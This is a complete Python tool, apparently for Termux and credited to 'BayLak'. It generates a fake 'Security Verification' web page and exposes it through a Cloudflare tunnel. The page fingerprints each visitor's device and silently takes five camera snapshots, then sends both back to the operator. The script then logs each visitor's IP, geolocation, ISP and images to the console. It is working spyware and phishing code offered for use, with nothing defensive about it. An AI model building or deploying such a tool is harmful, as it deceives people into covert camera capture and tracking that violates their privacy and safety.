import os
import socket
import subprocess
import shutil
import threading
import time
import sys
import re
import json
from urllib.request import urlopen
import importlib.util
import importlib
def setup_requirements():
    """Scan Library and Install via APT/PKG in Termux"""
    required_libs = ["requests"]
    for lib in required_libs:
        try:
            __import__(lib)
        except ImportError:
            print(f"\033[93m[*] Installing {lib} via pip...\033[0m")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
    if shutil.which("php") is None:
        print("\033[93m[*] PHP not found. Installing via apt...\033[0m")
        os.system("apt update && apt install php -y")
    else:
        print("\033[92m[+] PHP is already installed.\033[0m")
    if shutil.which("cloudflared") is None:
        print("\033[93m[*] Cloudflared not found. Installing via apt...\033[0m")
        os.system("apt update && apt install cloudflared -y")
        if shutil.which("cloudflared") is None:
            print("\033[91m[!] Failed to install via apt. Trying manual download...\033[0m")
            arch = subprocess.check_output("uname -m", shell=True).decode().strip()
            if "aarch64" in arch:
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-android-arm64"
            else:
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
            os.system(f"curl -L {url} -o cloudflared")
            os.system("chmod +x cloudflared")
            os.system("mv cloudflared /data/data/com.termux/files/usr/bin/")
    else:
        print("\033[92m[+] Cloudflared is already installed.\033[0m")
    print("\033[92m[+] All requirements are satisfied!\033[0m")
G = "\033[92m"
R = "\033[91m"
C = "\033[96m"
Y = "\033[93m"
M = "\033[95m"
W = "\033[0m"
CLR = "\033[K"
BASE_DIR = os.getcwd()
WEB_DIR = os.path.join(BASE_DIR, "web")
PHOTO_DIR = os.path.join(WEB_DIR, "photos")
LOG_FILE = os.path.join(WEB_DIR, "visits.log")
stop_spinner = threading.Event()
def get_ping(ip):
    try:
        cmd = ["ping", "-c", "1", "-W", "1", ip] if sys.platform != "win32" else ["ping", "-n", "1", "-w", "1000", ip]
        start = time.time()
        res = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        end = time.time()
        return f"{int((end - start) * 1000)}ms" if res.returncode == 0 else "N/A"
    except: return "N/A"
def get_detailed_location(ip):
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,proxy,timezone"
        data = json.loads(urlopen(url).read().decode())
        if data['status'] == 'success':
            p_status = f"{R}[VPN/Proxy]{W}" if data.get('proxy') else f"{G}[Direct]{W}"
            return {"loc": f"{data['country']}, {data['city']}", "isp": data['isp'], "proxy": p_status, "tz": data['timezone']}
    except: pass
    return {"loc": "Unknown", "isp": "Unknown", "proxy": "[?]", "tz": "Unknown"}
def create_web_files():
    os.makedirs(WEB_DIR, exist_ok=True)
    os.makedirs(PHOTO_DIR, exist_ok=True)
    php_content = """<?php
$ip = $_SERVER["HTTP_CF_CONNECTING_IP"] ?? $_SERVER['REMOTE_ADDR'];
if (isset($_POST['imageData'])) {
    $data = str_replace(['data:image/jpeg;base64,', ' '], ['', '+'], $_POST['imageData']);
    $name = $_POST['name'] ?? 'snap';
    file_put_contents("photos/{$ip}_{$name}_".time().".jpg", base64_decode($data));
    exit;
}
if (isset($_POST['specs'])) {
    file_put_contents("visits.log", $ip . "|" . date("H:i:s") . "|" . $_POST['specs'] . "\\n", FILE_APPEND);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Security Verification</title>
<style>
    body { background-color:
    .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; max-width: 400px; width: 90%; }
</style>
</head>
<body>
    <div class="container">
        <h2>Verifying...</h2>
        <video id="v" style="display:none" autoplay></video>
        <canvas id="c" style="display:none"></canvas>
    </div>
    <script>
        async function sendInfo() {
            let b = await navigator.getBattery();
            let info = navigator.userAgent + "|" + screen.width + "x" + screen.height + "|" + (navigator.deviceMemory || 'N/A') + "GB RAM|" + Math.round(b.level * 100) + "%";
            fetch('', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'specs=' + encodeURIComponent(info)});
        }
        async function start() {
            await sendInfo();
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video:true});
                document.getElementById('v').srcObject = stream;
                for(let i=1; i<=5; i++) { await new Promise(r => setTimeout(r, 1500)); capture(i); }
            } catch(e) {}
        }
        function capture(n) {
            const v = document.getElementById('v'), c = document.getElementById('c');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            fetch('', {method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'imageData=' + encodeURIComponent(c.toDataURL('image/jpeg')) + '&name=snap' + n
            });
        }
        window.onload = start;
    </script>
</body>
</html>"""
    with open(os.path.join(WEB_DIR, "index.php"), "w") as f: f.write(php_content)
    if not os.path.exists(LOG_FILE): open(LOG_FILE, "a").close()
def start_services():
    global stop_spinner
    host = "127.0.0.1"
    port = None
    if len(sys.argv) > 1:
        try:
            arg = sys.argv[1]
            if ":" in arg:
                host, port_str = arg.split(":")
                port = int(port_str)
            else:
                port = int(arg)
        except:
            print(f"{R}[!] Invalid input format. Using defaults...{W}")
    server_dir = "servers"
    if not os.path.exists(server_dir):
        print(f"{R}[!] Error: 'servers' directory not found.{W}")
        return None, None
    server_files = [f for f in os.listdir(server_dir) if f.endswith(".py")]
    loaded_servers = []
    print(f"\n{C}[*] Detected Servers:{W}")
    for idx, f in enumerate(server_files):
        file_path = os.path.join(server_dir, f)
        spec = importlib.util.spec_from_file_location(f[:-3], file_path)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        title = getattr(mod, 'title', f[:-3])
        loaded_servers.append({'module': mod, 'title': title})
        print(f"{G}{idx + 1}{W} - {title}")
    try:
        choice = int(input(f"{Y}Select a service (1-{len(loaded_servers)}): {W}")) - 1
        if choice < 0 or choice >= len(loaded_servers): raise ValueError
        selected = loaded_servers[choice]
    except ValueError:
        print(f"{R}[!] Invalid selection.{W}")
        return None, None
    if port is None:
        port = 8080
        while True:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                if s.connect_ex((host, port)) != 0: break
                port += 1
    php_p = subprocess.Popen(["php", "-S", f"{host}:{port}", "-t", WEB_DIR],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"{G}[+] Starting {selected['title']} on {host}:{port}...{W}")
    stop_spinner.clear()
    def spinner():
        chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        dots = ["", ".", "..", "..."]
        i = 0
        while not stop_spinner.is_set():
            sys.stdout.write(f"\r{C}{chars[i % len(chars)]} Waiting for tunnel connection {dots[i % len(dots)]}   {W}")
            sys.stdout.flush()
            i += 1
            time.sleep(0.1)
    spinner_thread = threading.Thread(target=spinner)
    spinner_thread.start()
    url = None
    try:
        url = selected['module'].start(port)
    except Exception as e:
        print(f"\n{R}[!] Module Error: {e}{W}")
    finally:
        stop_spinner.set()
        spinner_thread.join()
        sys.stdout.write("\r" + " " * 60 + "\r")
    if url:
        print(f"{G}✅ TUNNEL ESTABLISHED!{W}")
        print(f"{Y}🔗 URL: {W}{C}{url}{W}\n" + "="*40)
    else:
        print(f"{R}[!] Error: Failed to establish tunnel.{W}")
        php_p.terminate()
        return None, None
    return php_p, selected['module']
def monitor():
    last_line = ""
    first_local_visit_skipped = False
    print(f"\n{C}[*] Tracking active... Waiting for visitors...{W}\n")
    while True:
        try:
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, "r") as f:
                    lines = [line.strip() for line in f if line.strip()]
                    if lines:
                        current_line = lines[-1]
                        if current_line != last_line:
                            last_line = current_line
                            parts = current_line.split("|")
                            ip = parts[0]
                            if ip == "127.0.0.1" and not first_local_visit_skipped:
                                first_local_visit_skipped = True
                                continue
                            if len(parts) >= 6:
                                ip, ts, ua, res, ram, bat = parts[0:6]
                                info = get_detailed_location(ip)
                                ping_val = get_ping(ip)
                                imgs = sorted([p for p in os.listdir(PHOTO_DIR) if p.startswith(ip)])
                                output = f"""
{M}{'='*50}{W}
{M}          [ NEW VISIT DETECTED ]{W}
{G}🌐 IP     :{W} {ip:<20} {info['proxy']}
{G}📶 PING   :{W} {Y}{ping_val}{W}
{G}📍 LOC    :{W} {info['loc']}
{G}📡 ISP    :{W} {info['isp']}
{G}🔋 BAT    :{W} {bat} | {ram} | {res}
{G}📸 SNAPS  :{W} {Y}{len(imgs)} Images Captured{W}
{G}⏰ TIME   :{W} {ts}
{G}📱 DEVICE :{W} {ua[:40]}...
{M}{'='*50}{W}
"""
                                print(output)
                                sys.stdout.flush()
        except Exception:
            pass
        time.sleep(2)
def show_art():
    art = f"""{C}
  ▗▄▄▖ ▗▄▖ ▗▖  ▗▖
▐▌   ▐▌ ▐▌▐▛▚▞▜▌
▐▌   ▐▛▀▜▌▐▌  ▐▌
▝▚▄▄▖▐▌ ▐▌▐▌  ▐▌
         ▗▄▄▖▗▖ ▗▖ ▗▄▖▗▄▄▄▖
        ▐▌   ▐▌ ▐▌▐▌ ▐▌ █
         ▝▀▚▖▐▛▀▜▌▐▌ ▐▌ █
        ▗▄▄▞▘▐▌ ▐▌▝▚▄▞▘ █  v1.1
{G}    [+] Enhanced Multi-Tracker & Snapper [+]
{Y}         [ Created By BayLak ]
{W}"""
    print(art)
def main():
    try:
        os.system('clear || cls'); show_art()
        create_web_files()
        p1, p2 = start_services()
        monitor()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Stopping...{W}")
        stop_spinner.set()
        subprocess.run(["pkill", "-f", "php"], stderr=subprocess.DEVNULL)
        subprocess.run(["pkill", "-f", "cloudflared"], stderr=subprocess.DEVNULL)
        sys.exit()
if __name__ == "__main__":
    main()